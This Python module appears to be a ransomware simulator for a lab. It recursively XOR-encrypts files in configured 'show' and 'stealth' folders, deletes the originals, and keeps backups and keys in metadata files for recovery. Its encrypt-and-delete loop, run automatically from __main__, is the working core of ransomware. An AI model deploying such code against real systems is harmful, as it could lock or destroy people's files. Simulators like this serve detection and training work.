import os
import hashlib
import base64
import time
import json
import shutil
from chaoscrypt.settings import (
    ENCRYPTED_SUFFIX, METADATA_SUFFIX, BACKUP_SUFFIX, TMP_SUFFIX, LOCK_TIMEOUT,
    CHUNK_SIZE, SHOW_TARGET_DIR, STEALTH_TARGET_DIR
)
from chaoscrypt.logbook import LogBook

class InterProcessFileLock:
    def __init__(self, filepath):
        self.lockfile = filepath + ".lock"
        self.acquired = False
    def __enter__(self):
        start = time.time()
        while True:
            try:
                fd = os.open(self.lockfile, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
                os.close(fd)
                self.acquired = True
                return self
            except FileExistsError:
                if time.time() - start > LOCK_TIMEOUT:
                    raise TimeoutError(f"Could not acquire lockfile: {self.lockfile}")
                time.sleep(0.1)
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.acquired and os.path.exists(self.lockfile):
            try: os.remove(self.lockfile)
            except: pass
            self.acquired = False

def gen_lab_key(length=16):
    return base64.urlsafe_b64encode(os.urandom(length)).decode("utf-8")

def xor_stream(in_fp, out_fp, key_bytes, with_hash=False):
    """
    Unified XOR (DRY): працює як для encryption, так і для decryption;
    Якщо with_hash=True — повертає (sha256hex, writtensize), інакше — тільки writtensize.
    """
    key_len = len(key_bytes)
    chunk_id = 0
    total = 0
    h = hashlib.sha256() if with_hash else None
    while True:
        chunk = in_fp.read(CHUNK_SIZE)
        if not chunk: break
        if h:
            h.update(chunk)
        k = key_bytes[chunk_id % key_len:] + key_bytes[:chunk_id % key_len]
        chunk_id += 1
        out_fp.write(bytes(c ^ k[i % key_len] for i, c in enumerate(chunk)))
        total += len(chunk)
    out_fp.flush()
    if with_hash:
        return h.hexdigest(), total
    else:
        return total

def save_metadata(meta, enc_path):
    meta_path = enc_path + METADATA_SUFFIX
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, indent=2)
    return meta_path

def load_metadata(enc_path):
    meta_path = enc_path + METADATA_SUFFIX
    if not os.path.isfile(meta_path):
        raise FileNotFoundError("No metadata file!")
    with open(meta_path, "r", encoding="utf-8") as f:
        return json.load(f)

class StreamingEncryptor:
    def __init__(self, phase):
        self.phase = phase
        self.logger = LogBook(phase=phase)

    def encrypt_file(self, filepath):
        abs_path = os.path.abspath(filepath)
        enc_path = abs_path + ENCRYPTED_SUFFIX
        tmp_path = enc_path + TMP_SUFFIX
        meta_path = enc_path + METADATA_SUFFIX
        backup_path = abs_path + BACKUP_SUFFIX
        result = None
        key_bytes = None
        try:
            with InterProcessFileLock(abs_path):
                shutil.copy2(abs_path, backup_path)
                key_b64 = gen_lab_key()
                key_bytes = base64.urlsafe_b64decode(key_b64.encode("utf-8"))
                with open(abs_path, "rb") as in_fp, open(tmp_path, "wb") as out_fp:
                    sha256, orig_size = xor_stream(in_fp, out_fp, key_bytes, with_hash=True)
                meta = {
                    "original_file": os.path.basename(abs_path),
                    "original_size": orig_size,
                    "sha256": sha256,
                    "key_b64": key_b64,
                    "phase": self.phase,
                    "timestamp": time.time(),
                    "backup_path": backup_path,
                }
                save_metadata(meta, enc_path)
                os.replace(tmp_path, enc_path)
                try: os.remove(abs_path)
                except Exception: pass
                self.logger.log_event("encryption", f"Encrypted atomically",
                                      metadata={"file": enc_path, "meta": meta_path, "backup": backup_path, "key": key_b64})
                result = enc_path, key_b64
        except Exception as e:
            self.logger.log_event("encryption", f"ERROR encrypting: {abs_path}, {e}", tag="error",
                                  metadata={"file": abs_path, "error": str(e)})
        finally:
            try: del key_bytes
            except: pass
            if os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
        return result

    def decrypt_file(self, encrypted_path, key_b64=None):
        abs_path = os.path.abspath(encrypted_path)
        tmp_path = abs_path + TMP_SUFFIX
        key_bytes = None
        result = False
        try:
            meta = load_metadata(abs_path)
            key = key_b64 or meta.get("key_b64")
            if not key:
                raise ValueError("No key available (neither input nor meta)")
            key_bytes = base64.urlsafe_b64decode(key.encode("utf-8"))
            orig_path = os.path.join(os.path.dirname(abs_path), meta["original_file"])
            with InterProcessFileLock(abs_path):
                with open(abs_path, "rb") as in_fp, open(tmp_path, "wb") as out_fp:
                    xor_stream(in_fp, out_fp, key_bytes)
            # Verify hash and length
            h = hashlib.sha256()
            length = 0
            with open(tmp_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk: break
                    h.update(chunk)
                    length += len(chunk)
            if h.hexdigest() == meta["sha256"] and length == meta["original_size"]:
                os.replace(tmp_path, orig_path)
                try: os.remove(abs_path)                              # .cclab
                except Exception: pass
                try: os.remove(abs_path + METADATA_SUFFIX)            # .meta
                except Exception: pass
                bak_path = meta.get("backup_path")
                if bak_path and os.path.exists(bak_path):
                    try: os.remove(bak_path)
                    except Exception: pass
                self.logger.log_event("recovery", f"File recovered atomically",
                                      metadata={"file": orig_path, "key": key})
                result = True
            else:
                self.logger.log_event("recovery", f"ERROR integrity mismatch: {abs_path}", tag="error",
                                      metadata={"file": abs_path, "sha256": h.hexdigest(), "size": length})
                try: os.remove(tmp_path)
                except Exception: pass
        except Exception as e:
            self.logger.log_event("recovery", f"ERROR decrypting: {abs_path}, {e}", tag="error",
                                  metadata={"file": abs_path, "error": str(e)})
            try: os.remove(tmp_path)
            except Exception: pass
        finally:
            try: del key_bytes
            except: pass
        return result

    def encrypt_folder(self, folder_path, recursive=True, limit=None):
        abs_folder = os.path.abspath(folder_path)
        nenc = 0
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if fname.endswith(ENCRYPTED_SUFFIX): continue
                file_path = os.path.join(root, fname)
                enc_path, key = self.encrypt_file(file_path)
                if enc_path: nenc += 1
                if limit and nenc >= limit: return nenc
            if not recursive: break
        self.logger.log_event("encryption", f"Folder encrypted bomb-proof",
                              metadata={"folder": abs_folder, "files_encrypted": nenc})
        return nenc

    def decrypt_folder(self, folder_path, key_b64=None, recursive=True, limit=None):
        abs_folder = os.path.abspath(folder_path)
        ndec = 0
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if not fname.endswith(ENCRYPTED_SUFFIX): continue
                file_path = os.path.join(root, fname)
                if self.decrypt_file(file_path, key_b64): ndec += 1
                if limit and ndec >= limit: return ndec
            if not recursive: break
        self.logger.log_event("recovery", f"Folder recovered bomb-proof",
                              metadata={"folder": abs_folder, "files_decrypted": ndec})
        return ndec

    def close(self):
        self.logger.close()

if __name__ == "__main__":
    encryptor_show = StreamingEncryptor("show")
    nenc = encryptor_show.encrypt_folder(SHOW_TARGET_DIR)
    print(f"[Show] Files encrypted: {nenc}")
    encryptor_show.close()

    encryptor_stealth = StreamingEncryptor("stealth")
    nenc2 = encryptor_stealth.encrypt_folder(STEALTH_TARGET_DIR)
    print(f"[Stealth] Files encrypted: {nenc2}")
    encryptor_stealth.close()
    # Recovery: автоматично бере ключ із .meta при decrypt_folder
    # encryptor_show.decrypt_folder(SHOW_TARGET_DIR)